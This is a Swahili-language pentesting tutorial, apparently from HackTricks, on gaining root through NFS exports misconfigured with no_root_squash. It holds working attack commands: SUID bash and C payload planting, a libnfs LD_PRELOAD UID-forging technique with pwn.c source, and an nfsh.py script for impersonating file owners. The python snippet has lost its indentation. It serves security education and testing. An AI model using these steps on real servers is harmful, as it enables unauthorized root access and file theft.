# Privilege Escalation ya Misconfiguration ya NFS No Root Squash

## Maelezo ya Msingi ya Squashing

Kwa NFS AUTH_SYS/AUTH_UNIX, server huweka ukaguzi wa ruhusa za faili kwa kutumia `uid` na `gid` zinazotumwa katika kila ombi la RPC. Security flavors nyingine, kama Kerberos, hutumia credentials tofauti, na server inaweza ku-map credentials za namba kabla ya kukagua ruhusa.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Hu-map kila UID na GID kwenye account ya anonymous, ambayo kwa kawaida huwa `nobody` (65534) kwenye Linux. `no_all_squash` ndiyo default kwa requests zisizo za root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Hii ndiyo default kwenye Linux na hu-map requests zenye UID/GID 0 (root) kwenye account ya anonymous; UID na GID nyingine hazifanyiwi squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Huzima root squashing, hivyo requests zenye UID/GID 0 zinaweza kutathminiwa kama root kwenye server.<sup>[[4]](#references)</sup>

Ikiwa client iliyoruhusiwa inaweza ku-mount export inayoweza kuandikwa katika **`/etc/exports`** iliyosanidiwa na **`no_root_squash`**, requests zake za UID/GID 0 zinaweza kuandika humo kama root user wa server.<sup>[[4]](#references)</sup>

Kwa maelezo zaidi kuhusu **NFS**, angalia:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 kwa kutumia bash:
- Kwenye client iliyoruhusiwa, mount export inayoweza kuandikwa kama root, copy **`/bin/bash`** ndani yake, weka bit yake ya **SUID**, kisha i-execute kutoka kwenye victim mount ambayo haitumii `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Ili file iliyopakiwa iendelee kuwa owned na root, server lazima itumie **`no_root_squash`**. Ikiwa root inafanyiwa squash, SUID binary ya account nyingine inawezekana tu wakati client inaweza kuiunda au kuimiliki kihalali kwa kutumia numeric UID/GID ya account hiyo.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Chaguo la 2 kwa kutumia code ya C iliyocompile:
- Mount saraka kutoka kwa client iliyoruhusiwa, nakili payload iliyocompile inayotumia vibaya ruhusa za **SUID**, weka bit yake ya **SUID**, kisha iteekeleze kutoka kwa victim (tazama baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Vikwazo vilevile kama awali
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit ya Ndani

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye mashine yako hadi kwenye mashine lengwa bado unaweza kutumia toleo la Remote ku-exploit privilege escalation hii kwa ku-tunnel ports zinazohitajika**.\
> Ujanja ufuatao ni muhimu wakati `/etc/exports` inazuia export kwa IP ya mashine lengwa: remote client haiwezi kui-mount, lakini mbinu ya ndani inaweza kufanya kazi kupitia share ambayo tayari ime-mount kwenye host iliyoruhusiwa.<sup>[[2]](#references)</sup>\
> Kwa mbinu hii ya libnfs isiyohitaji privileges, export katika **`/etc/exports`** lazima itumie flag ya `insecure` ili process iweze kutumia source port isiyohifadhiwa; `secure` ndiyo chaguo-msingi, ingawa process inayoweza ku-bind port iliyohifadhiwa haihitaji option hii.<sup>[[1]](#references)[[4]](#references)</sup>

### Taarifa za Msingi

NFSv3 AUTH_UNIX client hujumuisha effective UID, GID, na groups zake katika kila call, na server huzitumia kufanya permission checks. Mbinu hii ya ndani hutumia vibaya mfumo huo kwa kutengeneza RPC credentials kupitia [libnfs](https://github.com/sahlberg/libnfs); preload module yake inasaidia kubadilisha UID/GID katika NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Ku-compile Library

Mfano wa libnfs unaweza kuhitaji marekebisho kwa kernel lengwa; walkthrough iliyotumika hapa inabainisha hasa kwamba syscalls za fallocate zinapaswa kuwekwa kwenye comments kabla ya ku-compile preload module.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Kuendesha Exploit

Mfano huu unatengeneza C helper ndogo inayozindua shell, kisha kuiweka kwenye share na kutumia `ld_nfs.so` yenye UID 0 katika context ya NFS kuifanya iwe SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Kompile code ya exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Weka exploit kwenye share na urekebishe permissions zake kwa kughushi UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Tekeleza exploit ili kupata root privileges**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell kwa Ufikiaji wa Faili kwa Stealth

Mara tu ufikiaji wa root unapopatikana, pattern hii ya `nfsh.py` huweka effective UID kuwa UID ya file lengwa kabla ya kuendesha command, hivyo kuruhusu ufikiaji bila kubadilisha ownership kwa kujirudia.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Endesha kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Hadithi ya NFS privesc isiyojulikana sana](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Maelezo ya Itifaki ya NFS Version 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
